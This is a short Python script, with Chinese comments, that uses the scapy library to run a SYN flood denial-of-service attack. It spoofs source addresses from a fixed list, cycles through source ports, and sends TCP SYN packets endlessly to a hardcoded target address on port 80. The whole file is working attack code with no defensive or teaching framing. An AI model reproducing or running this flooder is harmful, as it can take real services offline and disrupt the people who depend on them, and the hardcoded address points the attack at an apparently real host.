import random
import threading
import time
from scapy.all import *


def synFlood(target_ip, target_port):
    # 伪造源地址IP
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    # 伪造源端口
    for sPort in range(1024, 65535):
        # 随机生成索引号
        index = random.randrange(4)
        IPLayer = IP(src=srcList[index], dst=target_ip)
        TCPLayer = TCP(sport=sPort, dport=target_port, flags='S')
        # 组装数据报
        pkt = IPLayer/TCPLayer
        # 发送数据报
        send(pkt)


def main():
    i = 1
    while True:
        t = threading.Thread(target=synFlood, args=('111.229.128.32', 80))
        t.start()
        t.join()
        print("{0}:发送一个数据包".format(i))
        i += 1
        time.sleep(1)


if __name__ == '__main__':
    main()